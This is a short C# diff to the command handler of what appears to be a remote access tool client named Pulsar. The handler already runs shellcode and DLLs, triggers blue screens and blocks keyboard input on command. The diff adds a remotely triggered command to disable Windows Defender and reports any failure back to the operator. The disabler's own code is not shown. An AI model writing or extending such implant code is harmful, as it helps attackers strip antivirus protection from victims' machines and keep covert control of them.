@@ -28,7 +28,7 @@ namespace Pulsar.Client.Messages
         private MonitorPower _monitorPower = new MonitorPower();
         private ShellcodeRunner _shellcodeRunner = new ShellcodeRunner();
         private DllRunner _dllRunner = new DllRunner(); // Added DLL runner
-
+        private WindowsDefenderDisabler _windowsDefenderDisabler = new WindowsDefenderDisabler(); // Added
         public bool CanExecute(IMessage message) =>
             message is DoBSOD ||
             message is DoSwapMouseButtons ||
@@ -37,7 +37,8 @@ namespace Pulsar.Client.Messages
             message is DoBlockKeyboardInput ||
             message is DoCDTray ||
             message is DoMonitorsOff ||
-            message is DoSendBinFile;
+            message is DoSendBinFile ||
+            message is DoDisableDefender; // Added
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -69,9 +70,22 @@ namespace Pulsar.Client.Messages
                 case DoSendBinFile msg:
                     Execute(sender, msg);
                     break;
+                case DoDisableDefender msg: // Added
+                    Execute(sender, msg);
+                    break;
             }
         }
-
+        private void Execute(ISender client, DoDisableDefender message)
+        {
+            try
+            {
+                _windowsDefenderDisabler.Handle(message, client);
+            }
+            catch (Exception ex)
+            {
+                client.Send(new SetStatus { Message = $"Failed to configure Windows Defender: {ex.Message}" });
+            }
+        }
         private void Execute(ISender client, DoSendBinFile message)
         {
             try
